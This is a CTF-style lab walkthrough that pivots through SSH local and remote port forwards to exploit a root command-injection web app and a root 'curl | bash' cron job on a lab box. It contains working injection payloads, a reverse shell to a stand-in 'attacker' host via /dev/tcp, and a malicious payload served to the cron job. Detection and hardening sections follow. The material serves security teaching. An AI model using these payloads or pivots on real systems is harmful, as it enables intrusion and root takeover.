# Chapter 07 — "Local Service + Port Forwarding" · Debrief

> Full walkthrough for `hollow-relay-01` (`target-pivot`). Reach a loopback-only
> root service through an SSH tunnel, then exploit it for code execution as root.
> Try the box with [README.md](README.md) first.

**Flag:** `/root/flag.txt` → `R2R{a_l00pback_service_is_one_ssh_dash_L_away}`

---

## The one idea

Not every privesc lives on the shell you landed on. Services bound to
`127.0.0.1` are invisible to the network — admins lean on that and skip auth,
run them as root, leave them unpatched. The moment you have *any* shell on the
box, "only reachable from localhost" stops being a boundary: SSH port forwarding
makes the target's loopback reachable from your attacker machine.

Here the loopback service is an internal **diagnostics web app**, running as
**root**, whose `/ping` endpoint shells out with unsanitised input — a textbook
**command injection**. Reach it through a tunnel and you have code execution as
root. A second loopback service, a root "updater", gives the same result from
the other forwarding direction.

**Recon that finds it:**

```bash
ss -tlnp                  # (or netstat -tlnp) — what listens, on which iface
# tcp LISTEN 127.0.0.1:8080  -> an internal web app, loopback only
```

---

## Reaching the service — SSH forwarding in three directions

```bash
# -L  LOCAL forward: bring the TARGET's loopback service to YOUR machine
ssh -L 8080:127.0.0.1:8080 labuser1@target-pivot
#    attacker:8080  ──tunnel──▶  target sees 127.0.0.1:8080
curl http://127.0.0.1:8080/                # the internal diagnostics app

# -R  REMOTE forward: push one of YOUR services onto the TARGET's loopback
ssh -R 9000:127.0.0.1:8000 labuser1@target-pivot
#    target:9000   ──tunnel──▶  attacker sees 127.0.0.1:8000
#    use when a root job on the target only fetches from 127.0.0.1, or the
#    target can't dial out to you — you publish your listener into its loopback.

# -D  DYNAMIC forward: a SOCKS proxy for a whole subnet behind the target
ssh -D 1080 labuser1@target-pivot
#    then: proxychains curl ...   /   curl --socks5 127.0.0.1:1080 ...
```

Add `-f -N` to push the tunnel into the background with no remote shell
(`-f` = fork after auth, `-N` = don't run a command). No SSH on the box? The
same forwards work with **chisel** (`chisel server --reverse` on the attacker,
`chisel client … R:8080:127.0.0.1:8080` on the target) or **socat**.

---

## Station A — local forward (-L) → web RCE  ·  ★★★☆

### 1. Recon
With the `-L` tunnel up, look at the app:
```bash
curl http://127.0.0.1:8080/
# Hollow Relay intranet diagnostics.  Try: /ping?host=127.0.0.1
curl -G 'http://127.0.0.1:8080/ping' --data-urlencode 'host=127.0.0.1' | head -1
# Running: ping -c1 -W1 127.0.0.1      <- it SHOWS you the shell command it builds
```
The page echoing the command it will run, with your value tacked on the end, is
the classic sign your input is concatenated into a shell line.

### 2. The flaw
`/ping?host=X` builds `"ping -c1 -W1 " + X` and runs it through `/bin/sh`. A `;`
(or `|`, `$(…)`, `&&`) in `host` starts a **new** command — and the whole app
runs as **root**.

### 3. Exploit
```bash
# attacker
ssh -f -N -L 8080:127.0.0.1:8080 labuser1@target-pivot
curl -G 'http://127.0.0.1:8080/ping' \
  --data-urlencode 'host=127.0.0.1; id; cat /root/flag.txt'
# ... uid=0(root) ...  R2R{...}
```
For an interactive shell, inject a reverse shell to a listener on your box:
```bash
curl -G 'http://127.0.0.1:8080/ping' \
  --data-urlencode 'host=127.0.0.1; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
```

### 4. Why it works
`subprocess.run(cmd, shell=True)` hands the whole string to `/bin/sh -c`, which
re-parses shell metacharacters — so `127.0.0.1; cat …` is two commands, not one
argument to `ping`. The service never validated `host`, and it runs as root, so
your second command runs as root. The **only** thing standing between you and
this bug was the loopback binding — which `-L` removed. (`curl -G
--data-urlencode` URL-encodes the `;` and spaces so they survive the query
string.)

### 5. Detect / 6. Harden — see the shared sections below.

---

## Station B — remote forward (-R) → the root updater  ·  ★★★☆

### 1. Recon
```bash
cat /etc/cron.d/rtr-updater
# * * * * * root curl -fs --max-time 5 http://127.0.0.1:9000/payload.sh | bash
```
Root fetches a script from a **loopback** port every minute and pipes it to a
shell. Nothing listens on `127.0.0.1:9000` — so the job does nothing. Your job
is to *become* that service.

### 2. The flaw
The target trusts code served on its own loopback and runs it as root. You can't
reach `127.0.0.1:9000` on the target from outside — but a **remote** forward lets
you publish your own listener onto the target's loopback. `-R` is the mirror of
`-L`: instead of pulling the target's service to you, you push yours to it.

### 3. Exploit
```bash
# attacker: serve the payload
mkdir web && printf 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag\n' > web/payload.sh
( cd web && python3 -m http.server 8000 & )

# attacker: publish it onto the target's 127.0.0.1:9000
ssh -f -N -R 9000:127.0.0.1:8000 labuser1@target-pivot

# the target's root cron now fetches OUR payload.sh and runs it; wait <=60s
ssh labuser1@target-pivot cat /tmp/flag
```

### 4. Why it works
`ssh -R 9000:127.0.0.1:8000` tells the target's sshd to listen on
`127.0.0.1:9000` and forward every connection back through the session to
`127.0.0.1:8000` on the attacker — your web server. So when root's cron curls
`http://127.0.0.1:9000/payload.sh`, it is really talking to *you*. It downloads
your script and runs it as root. `-R` binds the target's loopback by default
(no `GatewayPorts` needed), which is exactly where the updater looks.

> **Why `-R` here and not another `-L`?** Station A pulled a service *to* you.
> But this bug is a service on the target reaching *out* to its own loopback —
> you can't satisfy it by connecting in. `-R` is the tool for that shape:
> publish your listener onto the target's loopback so its root job talks to you.
> Recognising which direction a situation needs is the whole skill.

### 5/6. Detect & harden — shared below (plus: never pipe a network fetch to a
shell, and authenticate even loopback services).

---

## Detect (both stations)

```bash
# services running as root that shouldn't be:
ps -o user,cmd -ax | grep -E 'intranet|python3 .*8080'   # web app USER = root?
ss -tlnp                                   # what's listening, on which iface, as whom
# command injection: an app process with a sh/ping child it didn't mean to spawn,
# or request parameters containing ; | ` $(  reaching a diagnostics endpoint
# -R abuse: an sshd child holding a forwarded port; a root job piping curl | bash
auditctl -w /etc/cron.d -p wa -k crond_drop
```

## Harden (both stations)

- **Don't run internal services as root.** The diagnostics app runs as root on
  purpose; as an unprivileged service account, RCE would land you as that user,
  not root.
- **Don't build shell commands from user input.** Pass an argv array
  (`subprocess.run(["ping","-c1",host])`, no `shell=True`) so there's no shell to
  re-parse, and validate `host` to a strict hostname/IP pattern.
- **Never `curl … | bash`** (Station B): don't fetch-and-execute, and
  authenticate even loopback endpoints.
- **Loopback binding is not a control.** Firewall and authenticate internal
  services as if they were exposed; assume any shell on the host can reach them.
- **Lock down forwarding** where it isn't needed: `AllowTcpForwarding no`,
  per-user `permitopen`, `GatewayPorts no`.

## Real world
Internal services bound to `127.0.0.1` — admin panels, debug consoles,
diagnostics tools, metrics endpoints, unauth Jenkins/Redis/Elasticsearch — are
routinely unauthenticated and over-privileged because "nobody can reach them."
Anyone with a shell can, via an SSH forward. Command injection in a
network-tools feature is one of the most common web bugs (see
[[C09-Station-C-Command-Injection]]); here it's the same bug on an internal
service a tunnel away. The transferable skill is the pivot: *enumerate
listeners, forward the port, attack the service.*

---

## Clean up / reset

```bash
make reset-pivot
# or:
docker compose up -d --build --force-recreate target-pivot
```

## What you learned

- **`ss -tlnp` is part of privesc recon.** The win may be a service, not a file.
- **Loopback ≠ safe.** `ssh -L` (or `-R`, `-D`, chisel) dissolves the boundary.
- **A root service with a bug is root RCE.** Reaching it is the pivot; the bug
  (here, command injection) is the same class you'd exploit on any web target.
- **Know the three forwards:** `-L` pull a remote service to you, `-R` push your
  service to them, `-D` SOCKS a whole network — and which shape each situation needs.
- **The fixes are ordinary:** don't run services as root, don't build shell
  commands from input, don't `curl | bash`, and don't treat loopback as auth.

Recipes are collected in the
[Blue-Team Playbook](https://github.com/Adw0rm-sec/road-to-root/wiki/Blue-Team-Playbook).
